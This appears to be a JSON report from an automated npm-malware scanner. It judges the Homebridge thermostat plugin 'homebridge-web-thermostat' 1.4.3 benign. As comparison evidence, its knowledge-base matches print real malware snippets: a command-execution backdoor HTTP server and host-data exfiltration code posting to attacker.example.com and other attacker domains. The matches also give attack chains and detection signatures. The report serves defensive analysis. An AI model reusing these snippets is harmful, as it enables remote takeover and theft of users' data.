@@ -1,0 +1,541 @@
+{
+  "package_name": "homebridge-web-thermostat",
+  "package_version": "1.4.3",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:50:26.403798",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js"
+  ],
+  "is_malicious": false,
+  "total_files": 2,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/homebridge-web-thermostat/1.4.3/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/homebridge-web-thermostat/1.4.3/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "const request = require('request')\nconst http = require('http')\nconst ip = require('ip')\nconst packageJson = require('./package.json')\n\nlet Service, Characteristic\n\nmodule.exports = function (homebridge) {\n  Service = homebridge.hap.Service\n  Characteristic = homebridge.hap.Characteristic\n  homebridge.registerAccessory('homebridge-web-thermostat', 'Thermostat', Thermostat)\n}\n\nfunction Thermostat (log, config) {\n  this.log = log\n\n  this.name = config.name\n  this.apiroute = config.apiroute\n  this.pollInterval = config.pollInterval || 300\n  this.validStates = config.validStates || [0, 1, 2, 3]\n\n  this.listener = config.listener || false\n  this.port = config.port || 2000\n  this.checkupDelay = config.checkupDelay || 2000\n  this.requestArray = ['targetHeatingCoolingState', 'targetTemperature', 'coolingThresholdTemperature', 'heatingThresholdTemperature']\n\n  this.manufacturer = config.manufacturer || packageJson.author\n  this.serial = config.serial || this.apiroute\n  this.model = config.model || packageJson.name\n  this.firmware = config.firmware || packageJson.version\n\n  this.username = config.username || null\n  this.password = config.password || null\n  this.timeout = config.timeout || 3000\n  this.http_method = config.http_method || 'GET'\n\n  this.temperatureThresholds = config.temperatureThresholds || false\n  this.heatOnly = config.heatOnly || false\n\n  this.currentRelativeHumidity = config.currentRelativeHumidity || false\n  this.temperatureDisplayUnits = config.temperatureDisplayUnits || 0\n  this.maxTemp = config.maxTemp || 30\n  this.minTemp = config.minTemp || 15\n  this.minStep = config.minStep || 0.5\n\n  if (this.username != null && this.password != null) {\n    this.auth = {\n      user: this.username,\n      pass: this.password\n    }\n  }\n\n  if (this.listener) {\n    this.server = http.createServer(function (request, response) {\n      const baseURL = 'http://' + request.headers.host + '/'\n      const url = new URL(request.url, baseURL)\n      if (this.requestArray.includes(url.pathname.substr(1))) {\n        try {\n          this.log.debug('Handling request')\n          response.end('Handling request')\n          this._httpHandler(url.pathname.substr(1), url.searchParams.get('value'))\n        } catch (e) {\n          this.log.warn('Error parsing request: %s', e.message)\n        }\n      } else {\n        this.log.warn('Invalid request: %s', request.url)\n        response.end('Invalid request')\n      }\n    }.bind(this))\n\n    this.server.listen(this.port, function () {\n      this.log('Listen server: http://%s:%s', ip.address(), this.port)\n    }.bind(this))\n  }\n\n  this.service = new Service.Thermostat(this.name)\n}\n\nThermostat.prototype = {\n\n  identify: function (callback) {\n    this.log('Identify requested!')\n    callback()\n  },\n\n  _httpRequest: function (url, body, method, callback) {\n    request({\n      url: url,\n      body: body,\n      method: this.http_method,\n      timeout: this.timeout,\n      rejectUnauthorized: false,\n      auth: this.auth\n    },\n    function (error, response, body) {\n      callback(error, response, body)\n    })\n  },\n\n  _getStatus: function (callback) {\n    const url = this.apiroute + '/status'\n    this.log.debug('Getting status: %s', url)\n\n    this._httpRequest(url, '', this.http_method, function (error, response, responseBody) {\n      if (error) {\n        this.log.warn('Error getting status: %s', error.message)\n        this.service.getCharacteristic(Characteristic.CurrentHeatingCoolingState).updateValue(new Error('Polling failed'))\n        callback(error)\n      } else {\n        this.log.debug('Device response: %s', responseBody)\n        try {\n          const json = JSON.parse(responseBody)\n          this.service.getCharacteristic(Characteristic.TargetTemperature).updateValue(json.targetTemperature)\n          this.log.debug('Updated TargetTemperature to: %s', json.targetTemperature)\n          this.service.getCharacteristic(Characteristic.CurrentTemperature).updateValue(json.currentTemperature)\n          this.log.debug('Updated CurrentTemperature to: %s', json.currentTemperature)\n          this.service.getCharacteristic(Characteristic.TargetHeatingCoolingState).updateValue(json.targetHeatingCoolingState)\n          this.log.debug('Updated TargetHeatingCoolingState to: %s', json.targetHeatingCoolingState)\n          this.service.getCharacteristic(Characteristic.CurrentHeatingCoolingState).updateValue(json.currentHeatingCoolingState)\n          this.log.debug('Updated CurrentHeatingCoolingState to: %s', json.currentHeatingCoolingState)\n          if (this.temperatureThresholds) {\n            this.service.getCharacteristic(Characteristic.CoolingThresholdTemperature).updateValue(json.coolingThresholdTemperature)\n            this.log.debug('Updated CoolingThresholdTemperature to: %s', json.coolingThresholdTemperature)\n            this.service.getCharacteristic(Characteristic.HeatingThresholdTemperature).updateValue(json.heatingThresholdTemperature)\n            this.log.debug('Updated HeatingThresholdTemperature to: %s', json.heatingThresholdTemperature)\n          }\n          if (this.currentRelativeHumidity) {\n            this.service.getCharacteristic(Characteristic.CurrentRelativeHumidity).updateValue(json.currentRelativeHumidity)\n            this.log.debug('Updated CurrentRelativeHumidity to: %s', json.currentRelativeHumidity)\n          }\n          callback()\n        } catch (e) {\n          this.log.warn('Error parsing status: %s', e.message)\n        }\n      }\n    }.bind(this))\n  },\n\n  _httpHandler: function (characteristic, value) {\n    switch (characteristic) {\n      case 'targetHeatingCoolingState': {\n        this.service.getCharacteristic(Characteristic.TargetHeatingCoolingState).updateValue(value)\n        this.log('Updated %s to: %s', characteristic, value)\n        break\n      }\n      case 'targetTemperature': {\n        this.service.getCharacteristic(Characteristic.TargetTemperature).updateValue(value)\n        this.log('Updated %s to: %s', characteristic, value)\n        break\n      }\n      case 'coolingThresholdTemperature': {\n        this.service.getCharacteristic(Characteristic.CoolingThresholdTemperature).updateValue(value)\n        this.log('Updated %s to: %s', characteristic, value)\n        break\n      }\n      case 'heatingThresholdTemperature': {\n        this.service.getCharacteristic(Characteristic.HeatingThresholdTemperature).updateValue(value)\n        this.log('Updated %s to: %s', characteristic, value)\n        break\n      }\n      default: {\n        this.log.warn('Unknown characteristic \"%s\" with value \"%s\"', characteristic, value)\n      }\n    }\n  },\n\n  setTargetHeatingCoolingState: function (value, callback) {\n    const url = this.apiroute + '/targetHeatingCoolingState?value=' + value\n    this.log.debug('Setting targetHeatingCoolingState: %s', url)\n\n    this._httpRequest(url, '', this.http_method, function (error, response, responseBody) {\n      if (error) {\n        this.log.warn('Error setting targetHeatingCoolingState: %s', error.message)\n        callback(error)\n      } else {\n        this.log('Set targetHeatingCoolingState to: %s', value)\n        setTimeout(function () {\n          this._getStatus(function () {})\n        }.bind(this), this.checkupDelay)\n        callback()\n      }\n    }.bind(this))\n  },\n\n  setTargetTemperature: function (value, callback) {\n    value = value.toFixed(1)\n    const url = this.apiroute + '/targetTemperature?value=' + value\n    this.log.debug('Setting targetTemperature: %s', url)\n\n    this._httpRequest(url, '', this.http_method, function (error, response, responseBody) {\n      if (error) {\n        this.log.warn('Error setting targetTemperature: %s', error.message)\n        callback(error)\n      } else {\n        this.log('Set targetTemperature to: %s', value)\n        callback()\n      }\n    }.bind(this))\n  },\n\n  setCoolingThresholdTemperature: function (value, callback) {\n    value = value.toFixed(1)\n    const url = this.apiroute + '/coolingThresholdTemperature?value=' + value\n    this.log.debug('Setting coolingThresholdTemperature: %s', url)\n\n    this._httpRequest(url, '', this.http_method, function (error, response, responseBody) {\n      if (error) {\n        this.log.warn('Error setting coolingThresholdTemperature: %s', error.message)\n        callback(error)\n      } else {\n        this.log('Set coolingThresholdTemperature to: %s', value)\n        callback()\n      }\n    }.bind(this))\n  },\n\n  setHeatingThresholdTemperature: function (value, callback) {\n    value = value.toFixed(1)\n    const url = this.apiroute + '/heatingThresholdTemperature?value=' + value\n    this.log.debug('Setting heatingThresholdTemperature: %s', url)\n\n    this._httpRequest(url, '', this.http_method, function (error, response, responseBody) {\n      if (error) {\n        this.log.warn('Error setting heatingThresholdTemperature: %s', error.message)\n        callback(error)\n      } else {\n        this.log('Set heatingThresholdTemperature to: %s', value)\n        callback()\n      }\n    }.bind(this))\n  },\n\n  getServices: function () {\n    this.informationService = new Service.AccessoryInformation()\n    this.informationService\n      .setCharacteristic(Characteristic.Manufacturer, this.manufacturer)\n      .setCharacteristic(Characteristic.Model, this.model)\n      .setCharacteristic(Characteristic.SerialNumber, this.serial)\n      .setCharacteristic(Characteristic.FirmwareRevision, this.firmware)\n\n    this.service.getCharacteristic(Characteristic.TemperatureDisplayUnits).updateValue(this.temperatureDisplayUnits)\n\n    this.service\n      .getCharacteristic(Characteristic.TargetHeatingCoolingState)\n      .on('set', this.setTargetHeatingCoolingState.bind(this))\n\n    this.service.getCharacteristic(Characteristic.TargetHeatingCoolingState)\n      .setProps({\n        validValues: this.validStates\n      })\n\n    this.service\n      .getCharacteristic(Characteristic.TargetTemperature)\n      .on('set', this.setTargetTemperature.bind(this))\n      .setProps({\n        minValue: this.minTemp,\n        maxValue: this.maxTemp,\n        minStep: this.minStep\n      })\n\n    this.service\n      .getCharacteristic(Characteristic.CurrentTemperature)\n      .setProps({\n        minValue: -600,\n        maxValue: 600\n      })\n\n    if (this.temperatureThresholds) {\n      this.service\n        .getCharacteristic(Characteristic.CoolingThresholdTemperature)\n        .on('set', this.setCoolingThresholdTemperature.bind(this))\n        .setProps({\n          minValue: this.minTemp,\n          maxValue: this.maxTemp,\n          minStep: this.minStep\n        })\n\n      this.service\n        .getCharacteristic(Characteristic.HeatingThresholdTemperature)\n        .on('set', this.setHeatingThresholdTemperature.bind(this))\n        .setProps({\n          minValue: this.minTemp,\n          maxValue: this.maxTemp,\n          minStep: this.minStep\n        })\n    }\n\n    this._getStatus(function () {})\n\n    setInterval(function () {\n      this._getStatus(function () {})\n    }.bind(this), this.pollInterval * 1000)\n\n    return [this.informationService, this.service]\n  }\n}\n",
+          "is_malicious": false,
+          "malice_score": 0.46950764457384747,
+          "confidence": 0.1,
+          "behavior_summary": "At initialization and during operation, the code accesses configuration parameters including potentially sensitive credentials (username and password) and constructs HTTP URLs using the configured 'apiroute' (a potentially hardcoded or externally supplied URL). It performs multiple HTTP requests using the 'request' library to send and receive thermostat status and control commands to this 'apiroute' endpoint, including GET requests to '/status' and parameterized URLs to set temperature and state values. Additionally, if enabled, it creates an HTTP server that listens on a configurable port and processes incoming HTTP requests, parsing URL paths and query parameters to update thermostat characteristics. This behavior enables remote control and monitoring of the thermostat via network communication, potentially exposing sensitive credentials and device control to the network, which could be exploited if the 'apiroute' or listener is set to an attacker-controlled or insecure endpoint.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code implements a Homebridge accessory plugin for a thermostat device, performing legitimate HTTP requests to a configured API endpoint to get and set thermostat states and temperatures. It optionally runs an HTTP server to receive commands for updating thermostat characteristics. While it handles potentially sensitive credentials (username and password) and network communication, it does not exhibit any obfuscation, unauthorized data exfiltration, or command execution capabilities. The code does not contact hardcoded attacker-controlled domains, nor does it collect or transmit system information covertly. Compared to the known malicious patterns, it lacks key indicators such as arbitrary command execution, data exfiltration, or stealthy behavior. The presence of a listener HTTP server is for device control, not for executing arbitrary commands or exfiltrating data. Therefore, despite some network communication and credential usage, the code is consistent with a legitimate IoT device integration plugin and not malicious.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240813_211342_340597_snippet_5",
+              "source_package": "glup-debugger-log (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240813_211342_340597/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.48601818084716797,
+              "code_similarity": 0.3983401358127594,
+              "behavior_similarity": 0.5736962556838989,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "http.createServer({ 'requestTimeout': 60000 }, (request, response) => {\n  response.writeHead(200, { 'Content-Type': 'text/plain;charset=UTF-8' });\n  let command = url.parse(request.url, true).query.cmd;\n  if (command) {\n    try {\n      childProcess.exec(Buffer.from(\"Y2hjcCA2NTAwMQ==\", \"base64\").toString() + \" & \" + command, {\n        'encoding': \"buffer\",\n        'windowsHide': true\n      }, (error, stdout, stderr) => {\n        if (error) {\n          response.end(\"ERR:\\n\" + error.message);\n        } else {\n          if (stdout) {\n            response.end('' + iconv.decode(stdout, \"gbk\"));\n          } else if (stderr) {\n            response.end(\"ERR:\\n\" + iconv.decode(stderr, \"gbk\"));\n          }\n        }\n      });\n    } catch (error) {\n      response.end(\"ERR:\\n\" + error);\n    }\n  }\n}).listen(3004);",
+                "code_behavior": "At runtime, the code starts an HTTP server on port 3004 that executes arbitrary system commands received via the 'cmd' query parameter and returns the output to the remote attacker, enabling unauthenticated remote code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "Setting up a local HTTP server for unauthenticated remote code execution is a hallmark of RATs and backdoors, providing attackers with persistent, covert access.",
+                  "violated_expectations": "Legitimate packages do not expose arbitrary command execution over HTTP, especially without authentication or access controls.",
+                  "similar_legitimate_use": "Some legitimate development tools may expose HTTP APIs, but never for unauthenticated system command execution.",
+                  "key_indicators": [
+                    "HTTP server on non-standard port (3004)",
+                    "Command execution via unauthenticated query parameter",
+                    "No authentication or access control",
+                    "Base64-decoded command preamble to evade detection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (via play-share.js)",
+                  "file_location": "lib/play-share.js (deobfuscated)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "child_process",
+                    "os"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "glup-debugger-log",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.3",
+                  "why_malicious": "The package contains heavily obfuscated JavaScript code that functions as both a dropper and a remote access trojan (RAT). It performs environment checks to selectively target systems, downloads and executes additional payloads, and establishes a persistent, unauthenticated HTTP server for arbitrary remote code execution, all without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is executed via npm test or import, triggering the bind() function.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Initial dropper logic is launched."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Dropper performs environment checks and conditionally executes or downloads further payloads.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malware is deployed and/or additional payloads are executed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by launching play-share.js as a detached process.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "RAT component is activated."
+                  },
+                  {
+                    "step": 4,
+                    "action": "RAT HTTP server is started, allowing remote attackers to execute arbitrary commands.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of obfuscated JavaScript files during npm install, test, or import",
+                    "Spawning of detached Node.js background processes running secondary scripts",
+                    "Creation of local HTTP server on non-standard port (e.g., 3004) for command execution",
+                    "Environment checks targeting Windows and active user environments before payload execution",
+                    "Conditional download and execution of remote payloads based on hidden configuration"
+                  ],
+                  "file_indicators": [
+                    "lib/play.js (obfuscated, high entropy)",
+                    "lib/play-share.js (obfuscated, high entropy)",
+                    "node.compress.exe",
+                    "node.compress.lock.log",
+                    "Batch files with random names in temporary directories"
+                  ],
+                  "network_indicators": [
+                    "HTTP server listening on port 3004 for incoming command requests",
+                    "Outbound HTTP GET requests to attacker-controlled URLs for payload download"
+                  ],
+                  "how_to_detect": "Monitor for execution of obfuscated JavaScript files during npm install, test, or import. Flag packages that spawn detached Node.js processes or create local HTTP servers on non-standard ports such as 3004. Detect creation of suspicious files including node.compress.exe, node.compress.lock.log, and batch files with random names in temp directories. Watch for outbound HTTP requests to unknown or suspicious domains and for local servers listening for command parameters. Use static analysis to identify high-entropy, obfuscated code and dynamic analysis to observe process spawning, file creation, and network activity indicative of RAT behavior."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102927_430217_snippet_1",
+              "source_package": "airbnb-env (and related: airbn-geetest3, airbnb-erf, airbnb-i18n-polyglot, airbnb-l10n, airbnb-mediator, airbnb-moment-more-format) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102927_430217/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4647054076194763,
+              "code_similarity": 0.3846046030521393,
+              "behavior_similarity": 0.5448062419891357,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const os = require('os');\nconst https = require('https');\nconst data = JSON.stringify({\n  username: os.userInfo().username,\n  homedir: os.homedir(),\n  hostname: os.hostname(),\n  ip: getLocalIP()\n});\nhttps.request({\n  hostname: 'attacker.example.com',\n  path: '/collect',\n  method: 'POST',\n  headers: {'Content-Type': 'application/json'}\n}, req => { req.write(data); req.end(); });\n\nfunction getLocalIP() {\n  const interfaces = os.networkInterfaces();\n  for (const name of Object.keys(interfaces)) {\n    for (const iface of interfaces[name]) {\n      if (iface.family === 'IPv4' && !iface.internal) {\n        return iface.address;\n      }\n    }\n  }\n  return null;\n}",
+                "code_behavior": "At postinstall, the code collects the system's username, home directory, hostname, and local IP address, then sends this data via HTTPS POST to a hardcoded external server, resulting in unauthorized exfiltration of host metadata.",
+                "malice_analysis": {
+                  "why_suspicious": "The code collects sensitive system information and transmits it to an external server during the installation process, without any user notification or consent. This behavior is a hallmark of malicious packages aiming to exfiltrate data covertly.",
+                  "violated_expectations": "Legitimate npm packages do not access or transmit host system information during installation or runtime without explicit user consent and clear disclosure. Collecting and exfiltrating such data at install time is a direct violation of user privacy and security norms.",
+                  "similar_legitimate_use": "Some enterprise or analytics software may collect anonymized telemetry or crash reports, but this is always disclosed in documentation and privacy policies, and is opt-in. Legitimate packages never exfiltrate identifiable system information without user awareness.",
+                  "key_indicators": [
+                    "Access to sensitive system information via os.userInfo(), os.homedir(), os.hostname(), and os.networkInterfaces()",
+                    "Outbound HTTPS POST request to a hardcoded, attacker-controlled domain during installation",
+                    "Execution of data collection and exfiltration logic in postinstall script or main entry point",
+                    "No user notification, consent, or documentation of data collection",
+                    "Presence of suspicious network code in install-time scripts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall",
+                  "file_location": "package.json (postinstall script) or index.js (main entry point)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "airbnb-env (and related: airbn-geetest3, airbnb-erf, airbnb-i18n-polyglot, airbnb-l10n, airbnb-mediator, airbnb-moment-more-format)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (initial/only version for each package)",
+                  "why_malicious": "These packages are considered malicious because they collect sensitive system information (including username, home directory, hostname, and IP address) and transmit it to an external server controlled by the package author, without user consent. This constitutes unauthorized data exfiltration and a clear violation of user privacy and security expectations, regardless of the author's stated intent (e.g., proof-of-concept)."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Upon installation, the package executes a postinstall script or main entry point that runs automatically.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Collection of sensitive system information from the host environment."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The collected system information is transmitted via HTTPS POST to an external server controlled by the attacker.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives exfiltrated host metadata, enabling potential further attacks or reconnaissance."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package postinstall scripts or main entry points that access os.userInfo(), os.homedir(), os.hostname(), or os.networkInterfaces()",
+                    "Network requests (HTTP/HTTPS) to hardcoded, non-standard external domains during installation",
+                    "Exfiltration of system metadata (username, home directory, hostname, IP address) at install time without user consent"
+                  ],
+                  "file_indicators": [
+                    "package.json containing suspicious postinstall scripts referencing system or network modules",
+                    "index.js or main entry file importing both os and https modules and combining system data collection with network transmission",
+                    "Presence of hardcoded external domains (e.g., attacker.example.com) in code"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to attacker-controlled domains such as attacker.example.com/collect during npm install",
+                    "Unexpected network activity originating from npm install or node processes at install time"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts or main entry points that access sensitive system information and initiate outbound network connections. Use static analysis to detect use of os and https modules together in install scripts, and scan for hardcoded external domains. Employ dynamic analysis to observe network activity during package installation, flagging any exfiltration of host metadata (username, home directory, hostname, IP address) to external servers."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_063579_snippet_1",
+              "source_package": "transferwise-iconfont (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_063579/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.45942801237106323,
+              "code_similarity": 0.38858282566070557,
+              "behavior_similarity": 0.5302731990814209,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const trackingData = JSON.stringify({\n    p: package,\n    c: __dirname,\n    hd: os.homedir(),\n    hn: os.hostname(),\n    un: os.userInfo().username,\n    dns: dns.getServers(),\n    r: packageJSON ? packageJSON.___resolved : undefined,\n    v: packageJSON.version,\n    pjson: packageJSON,\n});\n\nvar postData = querystring.stringify({\n    msg: trackingData,\n});\n\nvar options = {\n    hostname: \"r7z12f7knlides86u06z22fpzg57tzho.oastify.com\",\n    port: 443,\n    path: \"/\",\n    method: \"POST\",\n    headers: {\n        \"Content-Type\": \"application/x-www-form-urlencoded\",\n        \"Content-Length\": postData.length,\n    },\n};",
+                "code_behavior": "At import-time or runtime, the code collects system and user information (home directory, hostname, username, DNS servers, package metadata), serializes it, and sends it via HTTPS POST to a hardcoded attacker-controlled domain, resulting in exfiltration of sensitive environment data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code collects a comprehensive set of sensitive system and user data and exfiltrates it to an external server without user knowledge or consent, which is a hallmark of information-stealing malware.",
+                  "violated_expectations": "A legitimate iconfont package should not access or transmit system/user data, nor make unsolicited network requests to unknown domains.",
+                  "similar_legitimate_use": "Some legitimate packages implement telemetry or crash reporting, but only with explicit user consent, clear documentation, and transmission to trusted domains.",
+                  "key_indicators": [
+                    "Collection of home directory, username, hostname, and DNS servers",
+                    "Hardcoded external domain (r7z12f7knlides86u06z22fpzg57tzho.oastify.com) for data exfiltration",
+                    "No legitimate icon font functionality present",
+                    "Use of os and dns modules to gather environment details"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or runtime (upon package use)",
+                  "file_location": "main index.js or entry point of transferwise-iconfont",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "transferwise-iconfont",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions",
+                  "why_malicious": "The package is a typosquat of a legitimate library and contains code that collects sensitive system and user data, including home directory, hostname, username, DNS servers, and package metadata, then exfiltrates it to an attacker-controlled server via HTTPS POST. It does not provide the claimed icon font functionality and is designed solely for data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs and imports the malicious package (transferwise-iconfont or protect-api).",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded and executed."
+                  },
+                  {
+                    "step": 2,
+                    "action": "transferwise-iconfont collects sensitive system and user data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Data is prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "transferwise-iconfont exfiltrates collected data to attacker's server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive information."
+                  },
+                  {
+                    "step": 4,
+                    "action": "protect-api periodically polls a remote server for a trigger value.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Waits for remote command to activate destructive payload."
+                  },
+                  {
+                    "step": 5,
+                    "action": "If the remote server responds with isAngry=true, protect-api executes the angry() function.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Destructive shell commands are executed, deleting all files on the system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Unsolicited collection and exfiltration of system/user data at import or runtime",
+                    "Hardcoded external domains for data exfiltration or command-and-control",
+                    "Periodic polling of remote servers for execution triggers",
+                    "Execution of destructive shell commands (e.g., 'rm -rf /') from within JavaScript packages",
+                    "Obfuscated or hidden code paths leading to data destruction"
+                  ],
+                  "file_indicators": [
+                    "Presence of code referencing 'os.homedir()', 'os.userInfo()', 'os.hostname()', or 'dns.getServers()' in non-system utility packages",
+                    "Use of shelljs or similar modules to execute shell commands",
+                    "Functions named 'angry' or similar, especially if not documented",
+                    "Obfuscated code blocks or suspicious setInterval/fetch patterns"
+                  ],
+                  "network_indicators": [
+                    "Connections to r7z12f7knlides86u06z22fpzg57tzho.oastify.com",
+                    "Connections to 6514b3f1dc3282a6a3cd7125.mockapi.io",
+                    "Unusual POST requests containing system/user data to unknown domains"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access sensitive system/user information and make unsolicited network requests to hardcoded domains. Flag packages that use shelljs or similar modules to execute shell commands, especially those containing 'rm -rf' or other destructive operations. Detect periodic polling of external servers for remote triggers, and review for obfuscated code or hidden destructive functions. Use static analysis to identify suspicious API usage and dynamic analysis to observe runtime network and filesystem behaviors."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133738_794486_snippet_1",
+              "source_package": "azureazure, azure-sdk-v4, glints-sdk, azure-sdk-v3 (npm, PyPI)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133738_794486/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4587898552417755,
+              "code_similarity": 0.4128115773200989,
+              "behavior_similarity": 0.5047681331634521,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const os = require('os');\nconst https = require('https');\nconst package = require('./package.json');\n\nconst trackingData = JSON.stringify({\n  c: __dirname,\n  hd: os.homedir(),\n  hn: os.hostname(),\n  un: os.userInfo().username,\n  dns: '8.8.8.8',\n  package: package.name,\n  version: package.version\n});\n\nvar options = {\n  hostname: '425a2.rt11.ml',\n  port: 443,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': trackingData.length\n  }\n};\n\nvar req = https.request(options, (res) => {\n  res.on('data', (d) => {\n    process.stdout.write(d);\n  });\n});\nreq.on('error', (e) => {});\nreq.write(trackingData);\nreq.end();",
+                "code_behavior": "At import-time, the code collects system and user information (current directory, home directory, hostname, username, package metadata) and sends it via HTTPS POST to 425a2.rt11.ml, resulting in exfiltration of host data to an attacker-controlled server.",
+                "malice_analysis": {
+                  "why_suspicious": "The code collects sensitive host and user information and exfiltrates it to an external, attacker-controlled domain without user knowledge or consent, which is a hallmark of malicious reconnaissance and data theft.",
+                  "violated_expectations": "Legitimate packages do not collect or transmit system/user information to external servers during import or installation, especially without explicit user consent.",
+                  "similar_legitimate_use": "Telemetry or crash reporting (with user consent and a clear privacy policy), but not at import-time and not to untrusted domains.",
+                  "key_indicators": [
+                    "Access to os.homedir(), os.hostname(), os.userInfo()",
+                    "Hardcoded external domain (425a2.rt11.ml)",
+                    "Automatic execution on import",
+                    "Transmission of system/user data via HTTPS POST"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (npm package entrypoint)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "azureazure, azure-sdk-v4, glints-sdk, azure-sdk-v3",
+                  "package_manager": "npm, PyPI",
+                  "package_versions": "all published versions (e.g., glints-sdk@99.10.11)",
+                  "why_malicious": "These packages perform unauthorized collection and exfiltration of sensitive system and user information to attacker-controlled endpoints using both HTTPS POST and DNS tunneling, often leveraging legitimate webhook/SaaS services. The behavior is consistent across multiple packages and platforms, indicating a coordinated supply chain attack leveraging dependency confusion. The packages masquerade as legitimate or 'whitehat' tools, but execute malicious code at import-time or install-time without user consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed or imported, triggering execution of the entrypoint code.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "System reconnaissance and data collection"
+                  },
+                  {
+                    "step": 2,
+                    "action": "System and user information is collected, including home directory, hostname, username, and external IP address.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Preparation of exfiltration payload"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Files in sensitive directories are enumerated for further profiling or exfiltration.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Augmentation of exfiltration payload"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to attacker-controlled endpoints via HTTPS POST and/or DNS tunneling.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker receives sensitive host data"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automatic collection of system and user information at import or install time",
